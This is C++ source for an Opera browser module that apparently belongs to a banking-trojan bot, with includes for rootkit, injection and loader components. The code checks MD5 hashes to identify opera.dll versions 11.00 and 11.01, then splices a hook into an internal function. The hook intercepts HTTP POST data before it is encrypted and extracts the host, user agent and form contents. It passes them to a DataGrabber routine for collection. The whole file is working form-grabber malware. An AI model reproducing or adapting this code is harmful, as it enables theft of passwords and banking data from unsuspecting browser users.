#include <windows.h>
#include <windowsx.h>

#include "GetApi.h"
#include "Utils.h"

#include "Memory.h"
#include "Strings.h"

#include "BotConfig.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Splice.h"
#include "Loader.h"

#include "Opera.h"

// Число поддерживаемых версий Opera
static const LONG OperaVerCount = 2;

// MD5-хеши opera.dll для версий: 11.00, 11.01
static BYTE OperaMD5Hashes [OperaVerCount][16] = {
        0xba, 0xc2, 0x26, 0x29, 0x9e, 0x10, 0x0d, 0x8e,
			  0x47, 0x09, 0xd1, 0xfc, 0xad, 0xe8, 0x96, 0xb9,		// 11.00
				0x95, 0xce, 0x52, 0x17, 0xd7, 0x39, 0x99, 0x95,
				0x25, 0xd9, 0x60, 0x30, 0x92, 0x1d, 0xaa, 0xf7	  // 11.01
       };

// Относительные адреса процедуры для хука в opera.dll
static DWORD OperaVAOffsets [OperaVerCount] = {
        0x007A0C,   // 11.00
				0x2BEFBF    // 11.01
       };

//  GetHookProcVA - на основе MD5-хешей определяет версию opera.dll
//  и возвращает V-адрес нужной функции или 0, в случае неудачи
static LONG GetHookProcVA();

// Все функции которые мы будем хучить для Opera
typedef int ( __stdcall *PGetPostProc   )( int i1, int iFlag, LPVOID lpMem, int nLen );
static PGetPostProc    Real_GetPostProc;


/************************************************************************/
/* Собственная реализация неэскпортируемой ф-и из opera.dll             */
// в неё приходят ещё не зашифрованные данные GET/POST запросов
//--------------------------------
// Параметры:
// i1 - не известно, скорее всего неявный указатель Self на объект класса
// iFlag - не известно, но в коде opera.dll всего один раз из нужного 
//         места вызывается с параметром 0x17
// lpMem - ук-ль на буфер с данными
// nLen - длина буфера
//--------------------------------
PCHAR szDbgBufTMP=NULL;
int __stdcall Hook_GetPostProc(int i1, int iFlag, LPVOID lpMem, int nLen)
{
	// Проверям, что вызваны из той процедуры, что нас интересует
	if (0x17 == iFlag)
	{
		// Т.к. в буфере может и не оказаться завершающего нуля, то
		// копируем данные в собственный sz-буфер и выводим данные
		// на отладочную консоль
		PCHAR szDbgBuf = STR::New((PCHAR)lpMem,(DWORD)nLen );
		m_memcpy(szDbgBuf, lpMem, nLen);
		if (szDbgBuf[0]!='G'&& szDbgBuf[0]!='P'&& szDbgBufTMP!=NULL)
		{
			PCHAR Temp = STR::New(szDbgBufTMP,(DWORD)nLen);
			PCHAR cHOST=GetTextBetween(Temp,"POST ","HTTP");
			
			bool IsHttps=false;
			if (Temp[4]=='S')
				IsHttps=true;
			
			//OutputDebugStr(Temp);
			PCHAR OUserAgent=GetTextBetween(Temp,"User-Agent: ","\r\n");
			STR::Free(Temp);
			Temp = STR::New(szDbgBufTMP,(DWORD)nLen);
			PCHAR cHOST2=GetTextBetween(Temp,"Host: ","\r\n");
			PCHAR Hosts;
			if(IsHttps) 
				Hosts	= STR::New(3,"https:\\\\",cHOST2,cHOST);
			else
				Hosts	= STR::New(3,"http:\\\\",cHOST2,cHOST);

			PCHAR Buf = STR::New(3, Hosts, "?|POST:", szDbgBuf);
			
			DataGrabber::AddData(Hosts, szDbgBuf, OUserAgent/*IEUserAgent*/, BROWSER_TYPE_O, DATA_TYPE_FORM );
			//SendFormGrabberLogs(Hosts, szDbgBuf, OUserAgent/*IEUserAgent*/, BROWSER_TYPE_O, DATA_TYPE_FORMGRAB );

			/*OutputDebugStr(cHOST2);
			OutputDebugStr(cHOST);
			OutputDebugStr(OUserAgent);*/
			STR::Free(Buf);
			STR::Free(cHOST2);
			STR::Free(cHOST);
			STR::Free(OUserAgent);
			STR::Free(Temp);
			STR::Free(Hosts);			
			STR::Free(szDbgBufTMP);
		}
		if (szDbgBuf[0]=='P')
		{
			szDbgBufTMP=szDbgBuf;
		}
	}

	// Вызываем оригинальную функцию
	return Real_GetPostProc(i1, iFlag, lpMem, nLen);
}

/************************************************************************/
bool WINAPI IsOpera()
{
	// Функция вернёт истину если она вызвана в процессе
	// Java.exe или Javaw.exe
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	// opera.exe
	if ( dwProcessHash == 0x7A38EBF3 )
		{
			MemFree( ModulePath );
			return true;
		}

	MemFree( ModulePath );
	return false;
}


/************************************************************************/
bool HookOpera()
{
	// функция вешает хуки на базовые функции которые использует
	// Opera для работы со своими окнами
	// Работает только в случае вызова из процесса Java

	if ( !IsOpera() )
	{
		return false;
	}

	DWORD HookVA = GetHookProcVA();
	if (HookVA)
		UnhookOpera(HookVA);

	HookOperaApi();

	return true;
}

/************************************************************************/
bool HookOperaApi()
{
	DWORD HookVA = GetHookProcVA();
	if (HookVA)
	{
		if ( HookApi2( 14, HookVA, (DWORD)&Hook_GetPostProc ) )
		{  
			__asm mov [Real_GetPostProc], eax			
		}
	}
	
	
	return true;
}

/************************************************************************/
LONG GetHookProcVA()
{
	// Вернём 0, если адрес определить не удалось
	LONG res = 0;

	// Получаем полный путь к загруженной opera.dll и считаем её MD5-хеш
	HMODULE hLib = (HMODULE)GetProcAddressEx( NULL, 14, 0 );
	char *szLibPath = (char *)MemAllocAndClear(MAX_PATH);
	if (pGetModuleFileNameA(hLib, szLibPath, MAX_PATH))
	{		
		// Считаем хеш от файла
		char *Hash = CalcFileMD5Hash(szLibPath);
		if (Hash)
		{
			for (int i = 0; i < OperaVerCount; i++)
			{
				// и сравниваем его с известными значениями
				if (0 == m_memcmp(Hash, OperaMD5Hashes[i], 16))
				{
					res = OperaVAOffsets[i];
					break;
				}
			}
			MemFree(Hash);
		}
	}
	MemFree(szLibPath);

	return res;
}